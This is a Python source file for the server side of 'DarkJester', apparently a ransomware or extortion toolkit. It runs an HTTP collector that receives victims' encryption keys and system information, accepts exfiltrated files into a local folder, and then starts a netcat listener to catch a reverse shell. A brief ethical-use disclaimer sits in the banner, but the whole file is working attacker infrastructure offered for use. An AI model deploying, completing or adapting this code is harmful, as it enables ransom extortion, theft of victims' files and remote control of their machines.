import http.server
import socketserver
import json
import os
import signal
import sys
import cgi
import subprocess
import time

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <EXFIL_PORT> <REVERSE_SHELL_PORT>")
    sys.exit(1)

IP = "0.0.0.0"
try:
    EXFIL_PORT = int(sys.argv[1])
    REVERSE_SHELL_PORT = int(sys.argv[2])
except ValueError:
    print("[!] Port must be an integer.")
    sys.exit(1)

banner = r"""
________                __        ____.                __
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|
        \/     \/           \/             \/     \/            \/
                                                    ~ Server

Disclaimer: DarkJester is intended solely for ethical and legitimate uses. We are not responsible for any malicious activities or unlawful actions that occur as a result of using DarkJester. It is your responsibility to ensure that the tool is used in compliance with all applicable laws and regulations. Misuse of DarkJester for harmful, illegal, or unauthorized purposes is strictly prohibited and will be at your own risk.
"""

file_name_output = 'SystemandKey.txt'
upload_folder = 'DarkJesterCollectedFiles'
os.makedirs(upload_folder, exist_ok=True)

data_store = {}

def save_data_to_file():
    with open(file_name_output, 'w') as f:
        f.write(f"[+] Key: {data_store.get('key', 'N/A')}\n")
        f.write("[+] System Information:\n")
        system_info = data_store.get('system_info', {})
        for k, v in system_info.items():
            f.write(f" {k}: {v}\n")

class CustomHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_POST(self):
        if self.path == '/store-key':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                key_data = json.loads(post_data)
                key = key_data.get('key')
                system_info = key_data.get('system_info')
                if key and system_info:
                    data_store['key'] = key
                    data_store['system_info'] = system_info
                    save_data_to_file()
                    print(f"[+] Key: {key}")
                    print("[+] System Information:")
                    for k, v in system_info.items():
                        print(f" {k}: {v}")
                    self.respond(200, {"message": "[+] Key and system information stored successfully"})
                    shutdown_server()
                    return
                self.respond(400, {"error": "[-] Key or system information is missing"})
            except json.JSONDecodeError:
                self.respond(400, {"error": "[-] Invalid JSON format"})

        elif self.path == '/upload':
            content_type, params = cgi.parse_header(self.headers['Content-Type'])
            if content_type != 'multipart/form-data':
                self.respond(400, {"error": "[-] Invalid content type"})
                return

            boundary = params['boundary'].encode('utf-8')
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)

            parts = body.split(boundary)
            for part in parts:
                if b'Content-Disposition' in part:
                    disposition = part.split(b'\r\n')[1].decode('utf-8')
                    if 'filename' in disposition:
                        filename = disposition.split('filename="')[1].split('"')[0]
                        file_data = part.split(b'\r\n\r\n')[1].split(b'\r\n--')[0]
                        file_path = os.path.join(upload_folder, filename)
                        try:
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            print(f"[+] File {filename} uploaded successfully.")
                            self.respond(200, {"message": "[+] File uploaded successfully"})
                        except Exception as e:
                            print(f"[-] Error uploading file: {e}")
                            self.respond(500, {"error": "[-] Error uploading file"})
                        return
            self.respond(400, {"error": "[-] No file found in the request"})

    def do_GET(self):
        if self.path == '/get-key':
            key = data_store.get('key')
            if key:
                self.respond(200, {"key": key})
            else:
                self.respond(404, {"error": "[-] Key not found"})

        elif self.path == '/get-system-info':
            system_info = data_store.get('system_info')
            if system_info:
                self.respond(200, {"system_info": system_info})
            else:
                self.respond(404, {"error": "[-] System information not found"})
        else:
            self.send_error(404, "Not Found")

    def respond(self, status_code, response_dict):
        response_json = json.dumps(response_dict)
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response_json)))
        self.end_headers()
        self.wfile.write(response_json.encode('utf-8'))

def shutdown_server():
    os.kill(os.getpid(), signal.SIGINT)

def start_nc_listener(port):
    print(f"[+] Starting netcat listener on port {port}...")
    try:
        subprocess.run(["nc", "-lnvp", str(port)], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error starting netcat: {e}")
    except KeyboardInterrupt:
        print(f"[*] Netcat listener stopped.")

if __name__ == "__main__":
    with socketserver.TCPServer((IP, EXFIL_PORT), CustomHandler) as httpd:
        try:
            print(banner)
            print(f"[+] Server is now listening on {IP}:{EXFIL_PORT}...")
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()
        except KeyboardInterrupt:
            http.server_close()
        finally:
            time.sleep(3)
            start_nc_listener(REVERSE_SHELL_PORT)
